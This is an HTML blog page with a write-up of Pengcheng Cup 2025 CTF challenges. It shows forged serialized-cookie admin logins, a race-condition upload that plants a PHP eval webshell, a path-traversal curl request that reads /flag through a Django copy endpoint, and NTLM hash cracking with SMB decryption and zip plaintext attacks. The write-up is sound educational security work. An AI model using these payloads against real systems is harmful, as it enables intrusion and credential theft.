<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta http-equiv=Content-Security-Policy content="upgrade-insecure-requests"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>鹏城杯 2025 Writeup | w8nn9z Blog</title><meta name=keywords content><meta name=description content="鹏城杯 2025 Writeup - w8nn9z Blog"><meta name=author content><link rel=canonical href=https://blog.w8nn9z.top/posts/ctf/pcb-2025-writeup/><link crossorigin=anonymous href=/assets/css/stylesheet.12a5629d0be5f885fd946d77257e55f74027ed2a35144a29e2db13f8f62b5f35.css integrity rel="preload stylesheet" as=style><link rel=icon href=https://blog.w8nn9z.top/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://blog.w8nn9z.top/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://blog.w8nn9z.top/favicon-32x32.png><link rel=apple-touch-icon href=https://blog.w8nn9z.top/apple-touch-icon.png><link rel=mask-icon href=https://blog.w8nn9z.top/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://blog.w8nn9z.top/posts/ctf/pcb-2025-writeup/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://blog.w8nn9z.top/posts/ctf/pcb-2025-writeup/"><meta property="og:site_name" content="w8nn9z Blog"><meta property="og:title" content="鹏城杯 2025 Writeup"><meta property="og:locale" content="zh-cn"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-12-13T00:00:00+00:00"><meta property="article:modified_time" content="2025-12-13T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="鹏城杯 2025 Writeup"><meta name=twitter:description content><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://blog.w8nn9z.top/posts/"},{"@type":"ListItem","position":2,"name":"CTF","item":"https://blog.w8nn9z.top/posts/ctf/"},{"@type":"ListItem","position":3,"name":"鹏城杯 2025 Writeup","item":"https://blog.w8nn9z.top/posts/ctf/pcb-2025-writeup/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"鹏城杯 2025 Writeup","name":"鹏城杯 2025 Writeup","description":"","keywords":[],"articleBody":"pcb5-ez_php dirsearch：\nTarget: http://192.168.18.22:25005/\r[18:27:29] Starting: [18:27:44] 302 - 0B - /dashboard.php -\u003e index.php [18:27:46] 200 - 19B - /flag.php [18:27:54] 302 - 0B - /profile.php -\u003e index.php [18:27:59] 200 - 1KB - /test.txt [18:28:00] 200 - 0B - /upload.php 网站是用Cookie里的identification进行鉴权的，默认的username是guest，考虑伪造admin发现需要bypass：\n\\61用来代替a即可bypass：\nidentification:TzoxMjoiU2Vzc2lvblxVc2VyIjoxOntzOjIyOiIAU2Vzc2lvblxVc2VyAHVzZXJuYW1lIjtTOjU6Ilw2MWRtaW4iO30= 直接读flag.php，发现对于后缀名有限制，不能是php，在php后加上/绕过：\npcb5-Uplssse user_auth伪造admin登录，is_admin改为1：\nuser_auth:Tzo0OiJVc2VyIjo0OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjE6IjEiO3M6MTA6ImlzTG9nZ2VkSW4iO2I6MTtzOjg6ImlzX2FkbWluIjtpOjE7fQ== 上传文件页面发现对于上传文件的检测是有耗时显示的，明显是提示打条件竞争，可以用burpsuite里的intruder一直上传文件shell.php：\n\u003c?php fputs (fopen(\"evil.php\",\"w\"),'\u003c?php @eval($_REQUEST[1]);?\u003e'); ?\u003e 再写个脚本一直访问shell.php，只要在删除文件前执行一次就可以实现写入一句话木马：\nimport requests url = \"http://192.168.18.26:25002/tmp/shell.php\" while True: resp = requests.get(url) if resp.status_code == 200: print(\"OK\") break else: print(\"NO\") 蚁剑连上就能找到根目录下的flag\npcb5-ezDjango urls.py：\nfrom django.urls import path from . import views app_name = 'cacheapp' urlpatterns = [ path('', views.index, name='index'), path('generate/', views.generate_page, name='generate_page'), path('upload/', views.upload_payload, name='upload_payload'), path('copy/', views.copy_file, name='copy_file'), path('cache/viewer/', views.cache_viewer, name='cache_viewer'), path('profile/', views.profile, name='profile'), path('cache/trigger/', views.cache_trigger, name='cache_trigger'), ] copy_file：\n@csrf_exempt def copy_file(request): if request.method == \"POST\": src = request.POST.get('src', '') dst = request.POST.get('dst', '') if not src or not dst: return json_error('Source and destination required') try: if not os.path.exists(src): return json_error('Source file not found') os.makedirs(os.path.dirname(dst), exist_ok=True) content = read_file_bytes(src) with open(dst, 'wb') as dest_file: dest_file.write(content) return json_success('File copied', src=src, dst=dst) except Exception as e: return json_error(str(e)) return render(request, 'copy.html') cache_viewer：\n@csrf_exempt def cache_viewer(request): if request.method == \"POST\": cache_key = request.POST.get('key', '') if not cache_key: return json_error('Cache key required') try: path = os.path.join(cache_dir(), cache_filename(cache_key)) if os.path.exists(path): content = read_file_bytes(path) return json_success('Read cache raw', cache_path=path, raw_content=content.hex()) return json_error(f'Cache file not found: {path}') except Exception as e: return json_error(str(e)) return render(request, 'cache_viewer.html') 缓存查看器 cache_viewer 能直接看到键名对应的缓存文件名称，所以只要猜到flag位置 /flag ，再利用 copy_file 就能实现任意文件读取：\ncurl -X POST \"http://192.168.18.27:25003/copy/\" -H \"Content-Type: application/x-www-form-urlencoded\" -d \"src=../../../flag\u0026dst=/tmp/django_cache/e4a25f7b052442a076b02ee9a1818d2e.djcache\"\r{\"status\": \"success\", \"message\": \"File copied\", \"src\": \"../../../flag\", \"dst\": \"/tmp/django_cache/e4a25f7b052442a076b02ee9a1818d2e.djcache\"} 解完hex就是flag：\npcb5-whiteout 题目给了个docker镜像备份，可以直接load：\ndocker load -i image.tar 发现是arm64，没办法直接运行容器，查看镜像创建历史：\ndocker history misc_docker_whiteout:latest --no-trunc\rIMAGE CREATED CREATED BY SIZE COMMENT\rsha256:b0d013d599371c1da34a59d86c5832e702ceddddc9a9eeef286e86028733204d 3 weeks ago RUN /bin/sh -c rm -f /opt/.data/.logs/syslog.bin \u0026\u0026 echo \"cleanup done\" \u003e /opt/app/log.txt # buildkit 13B buildkit.dockerfile.v0\r3 weeks ago RUN /bin/sh -c mkdir -p /data \u0026\u0026 dd if=/dev/urandom of=/data/noise.bin bs=1K count=32 \u0026\u0026 echo \"Nothing to see here...\" \u003e /data/readme.txt # buildkit 32.8kB buildkit.dockerfile.v0\r3 weeks ago COPY decode.py /opt/app/decode.py # buildkit 215B buildkit.dockerfile.v0\r3 weeks ago COPY cipher.bin /opt/.data/.logs/syslog.bin # buildkit 38B buildkit.dockerfile.v0\r3 weeks ago WORKDIR /opt/app 0B buildkit.dockerfile.v0\r3 weeks ago RUN /bin/sh -c apt-get update \u0026\u0026 apt-get install -y python3 \u0026\u0026 rm -rf /var/lib/apt/lists/* # buildkit 29.5MB buildkit.dockerfile.v0\r2 months ago /bin/sh -c #(nop) CMD [\"/bin/bash\"] 0B\r2 months ago /bin/sh -c #(nop) ADD file:2e0e653363da35febc0204e69cb713c0d1497720522f79d3d531980a7f291a39 in / 69.4MB\r2 months ago /bin/sh -c #(nop) LABEL org.opencontainers.image.version=22.04 0B\r2 months ago /bin/sh -c #(nop) LABEL org.opencontainers.image.ref.name=ubuntu 0B\r2 months ago /bin/sh -c #(nop) ARG LAUNCHPAD_BUILD_ARCH 0B\r2 months ago /bin/sh -c #(nop) ARG RELEASE 可以直接从blobs里去找需要的文件，一个是被删除的syslog.bin，还有一个是decode.py：\ndecode.py：\n# decode.py KEY = 0x37 def decode(path): with open(path, \"rb\") as f: data = f.read() return bytes(b ^ KEY for b in data) if __name__ == \"__main__\": print(decode(\"syslog.bin\")) pcb5-SMB NTLMRawUnHide：\npython NTLMRawUnHide.py -i SMB.pcapng\rFound NTLMSSP Message Type 1 : Negotiation\rFound NTLMSSP Message Type 2 : Challenge\r\u003e Server Challenge : 5649f6b5969a9fbf\rFound NTLMSSP Message Type 3 : Authentication\r\u003e Domain : PC\r\u003e Username : rockyou\r\u003e Workstation : PC\rNTLMv2 Hash recovered:\rrockyou::PC:5649f6b5969a9fbf:f8cb9296a5206484b1baf6bce47abe3b:0101000000000000f68d75c3fb59dc01ba30ab51dc5395c3000000000200160046004c00410047002d005300450052005600450052000100160046004c00410047002d005300450052005600450052000400160046004c00410047002d005300450052005600450052000300160046004c00410047002d0053004500520056004500520007000800f68d75c3fb59dc0106000400020000000800300030000000000000000100000000200000c06bb8a56b86b084ba3cfc2b7e5a0eaef96088346e865b0c93bdd8b4de440ff70a001000000000000000000000000000000000000900200063006900660073002f0046004c00410047002d005300450052005600450052000000000000000000 hashcat用rockyou字典爆破得到密码：12megankirwin12\n文件是用SMB3加密传输的，算出session key：\nfrom Crypto.Cipher import ARC4 from Crypto.Hash import MD4, MD5, HMAC password = '12megankirwin12' passwordHash = MD4.new(password.encode('utf-16-le')).hexdigest() username = 'rockyou' domain = 'PC' ntProofStr = 'f8cb9296a5206484b1baf6bce47abe3b' serverChallenge = '5649f6b5969a9fbf' sessionKey = '83ef8765dc2621899e86744f9dd9c5c8' responseKey = HMAC.new(bytes.fromhex(passwordHash), (username.upper()+domain.upper()).encode('utf-16-le'), MD5).digest() keyExchangeKey = HMAC.new(responseKey, bytes.fromhex(ntProofStr), MD5).digest() decryptedSessionKey = ARC4.new(keyExchangeKey).decrypt(bytes.fromhex(sessionKey)) print('Decrypted SMB Session Key is: {}'.format(decryptedSessionKey.hex())) 运行结果：\nDecrypted SMB Session Key is: a5bfafdad7cb6b35947e06faa4f2504d 流量包里找到session id：3100000000100000，和session key一起配置SMB2用于解密：\n可以导出letter.zip，压缩包里是letter.exe并且解压需要密码，根据exe的文件头来明文攻击，plain.txt：\nThis program cannot be run in DOS mode bkcrack：\nbkcrack.exe -C letter.zip -c letter.exe -o 78 -p plain.txt\rFound a solution. Stopping.\rYou may resume the attack with the option: --continue-attack 40468\r[21:02:51] Keys\r68cc45ab 864060ce ac958caa\rbkcrack.exe -C letter.zip -c letter.exe -k 33b19021 93c4a78d 9ceed931 -d letter.exe 运行程序输出flag随机的一部分，只要下好断点应该就能在运行过程中从内存里找到完整的flag：\ndebug过程中Alt+B：\n","wordCount":"1372","inLanguage":"en","datePublished":"2025-12-13T00:00:00Z","dateModified":"2025-12-13T00:00:00Z","mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.w8nn9z.top/posts/ctf/pcb-2025-writeup/"},"publisher":{"@type":"Organization","name":"w8nn9z Blog","logo":{"@type":"ImageObject","url":"https://blog.w8nn9z.top/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://blog.w8nn9z.top/ accesskey=h title="w8nn9z Blog (Alt + H)">w8nn9z Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://blog.w8nn9z.top/search title="搜索 (Alt + /)" accesskey=/><span>搜索</span></a></li><li><a href=https://blog.w8nn9z.top/posts title=文章><span>文章</span></a></li><li><a href=https://blog.w8nn9z.top/archives title=归档><span>归档</span></a></li><li><a href=https://blog.w8nn9z.top/about title=关于><span>关于</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">鹏城杯 2025 Writeup</h1><div class=post-meta><span title='2025-12-13 00:00:00 +0000 UTC'>December 13, 2025</span></div></header><aside id=toc-container class="toc-container wide"><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#pcb5-ez_php aria-label=pcb5-ez_php>pcb5-ez_php</a></li><li><a href=#pcb5-uplssse aria-label=pcb5-Uplssse>pcb5-Uplssse</a></li><li><a href=#pcb5-ezdjango aria-label=pcb5-ezDjango>pcb5-ezDjango</a></li><li><a href=#pcb5-whiteout aria-label=pcb5-whiteout>pcb5-whiteout</a></li><li><a href=#pcb5-smb aria-label=pcb5-SMB>pcb5-SMB</a></li></ul></div></details></div></aside><script>let activeElement,elements;document.addEventListener("DOMContentLoaded",function(){if(checkTocPosition(),elements=document.querySelectorAll("h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]"),elements.length>0){activeElement=elements[0];const e=encodeURI(activeElement.getAttribute("id")).toLowerCase();document.querySelector(`.inner ul li a[href="#${e}"]`).classList.add("active")}const t=document.getElementById("top-link");t&&t.addEventListener("click",e=>{e.preventDefault(),window.scrollTo({top:0,behavior:"smooth"})})},!1),window.addEventListener("resize",function(){checkTocPosition()},!1),window.addEventListener("scroll",()=>{const e=window.pageYOffset||document.documentElement.scrollTop;if(e===0)return;elements&&elements.length>0&&(activeElement=Array.from(elements).find(t=>{if(getOffsetTop(t)-e>0&&getOffsetTop(t)-e<window.innerHeight/2)return t})||activeElement,elements.forEach(e=>{const n=encodeURI(e.getAttribute("id")).toLowerCase(),t=document.querySelector(`.inner ul li a[href="#${n}"]`);if(e===activeElement){t.classList.add("active");const e=document.querySelector(".toc .inner"),n=t.offsetTop,s=e.clientHeight,o=t.clientHeight,i=n-s/2+o/2;e.scrollTo({top:i,behavior:"smooth"})}else t.classList.remove("active")}))},!1);const main=parseInt(getComputedStyle(document.body).getPropertyValue("--article-width"),10),toc=parseInt(getComputedStyle(document.body).getPropertyValue("--toc-width"),10),gap=parseInt(getComputedStyle(document.body).getPropertyValue("--gap"),10);function checkTocPosition(){const e=document.body.scrollWidth;e-main-toc*2-gap*4>0?document.getElementById("toc-container").classList.add("wide"):document.getElementById("toc-container").classList.remove("wide")}function getOffsetTop(e){if(!e.getClientRects().length)return 0;let t=e.getBoundingClientRect(),n=e.ownerDocument.defaultView;return t.top+n.pageYOffset}</script><div class=post-content><h2 id=pcb5-ez_php>pcb5-ez_php<a hidden class=anchor aria-hidden=true href=#pcb5-ez_php>#</a></h2><p>dirsearch：</p><pre tabindex=0><code>Target: http://192.168.18.22:25005/

[18:27:29] Starting:                                                                                                                                          
[18:27:44] 302 -    0B  - /dashboard.php  -&gt;  index.php                     
[18:27:46] 200 -   19B  - /flag.php                                         
[18:27:54] 302 -    0B  - /profile.php  -&gt;  index.php                       
[18:27:59] 200 -    1KB - /test.txt                                         
[18:28:00] 200 -    0B  - /upload.php
</code></pre><p>网站是用Cookie里的identification进行鉴权的，默认的username是guest，考虑伪造admin发现需要bypass：</p><p><img alt=alt loading=lazy src=/images/PCB2025/1.png></p><p><code>\61</code>用来代替<code>a</code>即可bypass：</p><pre tabindex=0><code>identification:TzoxMjoiU2Vzc2lvblxVc2VyIjoxOntzOjIyOiIAU2Vzc2lvblxVc2VyAHVzZXJuYW1lIjtTOjU6Ilw2MWRtaW4iO30=
</code></pre><p>直接读flag.php，发现对于后缀名有限制，不能是php，在php后加上<code>/</code>绕过：</p><p><img alt=alt loading=lazy src=/images/PCB2025/2.png></p><h2 id=pcb5-uplssse>pcb5-Uplssse<a hidden class=anchor aria-hidden=true href=#pcb5-uplssse>#</a></h2><p>user_auth伪造admin登录，<code>is_admin</code>改为1：</p><pre tabindex=0><code>user_auth:Tzo0OiJVc2VyIjo0OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjE6IjEiO3M6MTA6ImlzTG9nZ2VkSW4iO2I6MTtzOjg6ImlzX2FkbWluIjtpOjE7fQ==
</code></pre><p>上传文件页面发现对于上传文件的检测是有耗时显示的，明显是提示打条件竞争，可以用burpsuite里的intruder一直上传文件shell.php：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>fputs</span> (<span style=color:#a6e22e>fopen</span>(<span style=color:#e6db74>&#34;evil.php&#34;</span>,<span style=color:#e6db74>&#34;w&#34;</span>),<span style=color:#e6db74>&#39;&lt;?php @eval($_REQUEST[1]);?&gt;&#39;</span>);
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>再写个脚本一直访问shell.php，只要在删除文件前执行一次就可以实现写入一句话木马：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span>url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;http://192.168.18.26:25002/tmp/shell.php&#34;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
</span></span><span style=display:flex><span>    resp <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(url)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> resp<span style=color:#f92672>.</span>status_code <span style=color:#f92672>==</span> <span style=color:#ae81ff>200</span>:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;OK&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;NO&#34;</span>)
</span></span></code></pre></div><p>蚁剑连上就能找到根目录下的flag</p><h2 id=pcb5-ezdjango>pcb5-ezDjango<a hidden class=anchor aria-hidden=true href=#pcb5-ezdjango>#</a></h2><p>urls.py：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#f92672>from</span> django.urls <span style=color:#f92672>import</span> path
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> . <span style=color:#f92672>import</span> views
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>app_name <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;cacheapp&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>urlpatterns <span style=color:#f92672>=</span> [
</span></span><span style=display:flex><span>    path(<span style=color:#e6db74>&#39;&#39;</span>, views<span style=color:#f92672>.</span>index, name<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;index&#39;</span>),
</span></span><span style=display:flex><span>    path(<span style=color:#e6db74>&#39;generate/&#39;</span>, views<span style=color:#f92672>.</span>generate_page, name<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;generate_page&#39;</span>),
</span></span><span style=display:flex><span>    path(<span style=color:#e6db74>&#39;upload/&#39;</span>, views<span style=color:#f92672>.</span>upload_payload, name<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;upload_payload&#39;</span>),
</span></span><span style=display:flex><span>    path(<span style=color:#e6db74>&#39;copy/&#39;</span>, views<span style=color:#f92672>.</span>copy_file, name<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;copy_file&#39;</span>),
</span></span><span style=display:flex><span>    path(<span style=color:#e6db74>&#39;cache/viewer/&#39;</span>, views<span style=color:#f92672>.</span>cache_viewer, name<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;cache_viewer&#39;</span>),
</span></span><span style=display:flex><span>    path(<span style=color:#e6db74>&#39;profile/&#39;</span>, views<span style=color:#f92672>.</span>profile, name<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;profile&#39;</span>),
</span></span><span style=display:flex><span>    path(<span style=color:#e6db74>&#39;cache/trigger/&#39;</span>, views<span style=color:#f92672>.</span>cache_trigger, name<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;cache_trigger&#39;</span>),
</span></span><span style=display:flex><span>]
</span></span></code></pre></div><p>copy_file：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#a6e22e>@csrf_exempt</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>copy_file</span>(request):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> request<span style=color:#f92672>.</span>method <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;POST&#34;</span>:
</span></span><span style=display:flex><span>        src <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>POST<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;src&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>)
</span></span><span style=display:flex><span>        dst <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>POST<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;dst&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> src <span style=color:#f92672>or</span> <span style=color:#f92672>not</span> dst:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> json_error(<span style=color:#e6db74>&#39;Source and destination required&#39;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>exists(src):
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> json_error(<span style=color:#e6db74>&#39;Source file not found&#39;</span>)
</span></span><span style=display:flex><span>            os<span style=color:#f92672>.</span>makedirs(os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>dirname(dst), exist_ok<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>)
</span></span><span style=display:flex><span>            content <span style=color:#f92672>=</span> read_file_bytes(src)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>with</span> open(dst, <span style=color:#e6db74>&#39;wb&#39;</span>) <span style=color:#66d9ef>as</span> dest_file:
</span></span><span style=display:flex><span>                dest_file<span style=color:#f92672>.</span>write(content)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> json_success(<span style=color:#e6db74>&#39;File copied&#39;</span>, src<span style=color:#f92672>=</span>src, dst<span style=color:#f92672>=</span>dst)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> e:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> json_error(str(e))
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> render(request, <span style=color:#e6db74>&#39;copy.html&#39;</span>)
</span></span></code></pre></div><p>cache_viewer：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#a6e22e>@csrf_exempt</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>cache_viewer</span>(request):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> request<span style=color:#f92672>.</span>method <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;POST&#34;</span>:
</span></span><span style=display:flex><span>        cache_key <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>POST<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;key&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> cache_key:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> json_error(<span style=color:#e6db74>&#39;Cache key required&#39;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>            path <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>join(cache_dir(), cache_filename(cache_key))
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>exists(path):
</span></span><span style=display:flex><span>                content <span style=color:#f92672>=</span> read_file_bytes(path)
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> json_success(<span style=color:#e6db74>&#39;Read cache raw&#39;</span>, cache_path<span style=color:#f92672>=</span>path, raw_content<span style=color:#f92672>=</span>content<span style=color:#f92672>.</span>hex())
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> json_error(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;Cache file not found: </span><span style=color:#e6db74>{</span>path<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> e:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> json_error(str(e))
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> render(request, <span style=color:#e6db74>&#39;cache_viewer.html&#39;</span>)
</span></span></code></pre></div><p>缓存查看器 <code>cache_viewer</code> 能直接看到键名对应的缓存文件名称，所以只要猜到flag位置 <code>/flag</code> ，再利用 <code>copy_file</code> 就能实现任意文件读取：</p><pre tabindex=0><code>curl -X POST &#34;http://192.168.18.27:25003/copy/&#34; -H &#34;Content-Type: application/x-www-form-urlencoded&#34; -d &#34;src=../../../flag&amp;dst=/tmp/django_cache/e4a25f7b052442a076b02ee9a1818d2e.djcache&#34;
{&#34;status&#34;: &#34;success&#34;, &#34;message&#34;: &#34;File copied&#34;, &#34;src&#34;: &#34;../../../flag&#34;, &#34;dst&#34;: &#34;/tmp/django_cache/e4a25f7b052442a076b02ee9a1818d2e.djcache&#34;}
</code></pre><p>解完hex就是flag：</p><p><img alt=alt loading=lazy src=/images/PCB2025/3.png></p><h2 id=pcb5-whiteout>pcb5-whiteout<a hidden class=anchor aria-hidden=true href=#pcb5-whiteout>#</a></h2><p>题目给了个docker镜像备份，可以直接load：</p><pre tabindex=0><code>docker load -i image.tar
</code></pre><p>发现是arm64，没办法直接运行容器，查看镜像创建历史：</p><pre tabindex=0><code>docker history misc_docker_whiteout:latest --no-trunc
IMAGE                                                                     CREATED        CREATED BY                                                                                                                                                     SIZE      COMMENT
sha256:b0d013d599371c1da34a59d86c5832e702ceddddc9a9eeef286e86028733204d   3 weeks ago    RUN /bin/sh -c rm -f /opt/.data/.logs/syslog.bin &amp;&amp;     echo &#34;cleanup done&#34; &gt; /opt/app/log.txt # buildkit                                                      13B       buildkit.dockerfile.v0
&lt;missing&gt;                                                                 3 weeks ago    RUN /bin/sh -c mkdir -p /data &amp;&amp;     dd if=/dev/urandom of=/data/noise.bin bs=1K count=32 &amp;&amp;     echo &#34;Nothing to see here...&#34; &gt; /data/readme.txt # buildkit   32.8kB    buildkit.dockerfile.v0
&lt;missing&gt;                                                                 3 weeks ago    COPY decode.py /opt/app/decode.py # buildkit                                                                                                                   215B      buildkit.dockerfile.v0
&lt;missing&gt;                                                                 3 weeks ago    COPY cipher.bin /opt/.data/.logs/syslog.bin # buildkit                                                                                                         38B       buildkit.dockerfile.v0
&lt;missing&gt;                                                                 3 weeks ago    WORKDIR /opt/app                                                                                                                                               0B        buildkit.dockerfile.v0
&lt;missing&gt;                                                                 3 weeks ago    RUN /bin/sh -c apt-get update &amp;&amp; apt-get install -y python3 &amp;&amp; rm -rf /var/lib/apt/lists/* # buildkit                                                          29.5MB    buildkit.dockerfile.v0
&lt;missing&gt;                                                                 2 months ago   /bin/sh -c #(nop)  CMD [&#34;/bin/bash&#34;]                                                                                                                           0B
&lt;missing&gt;                                                                 2 months ago   /bin/sh -c #(nop) ADD file:2e0e653363da35febc0204e69cb713c0d1497720522f79d3d531980a7f291a39 in /                                                               69.4MB
&lt;missing&gt;                                                                 2 months ago   /bin/sh -c #(nop)  LABEL org.opencontainers.image.version=22.04                                                                                                0B
&lt;missing&gt;                                                                 2 months ago   /bin/sh -c #(nop)  LABEL org.opencontainers.image.ref.name=ubuntu                                                                                              0B
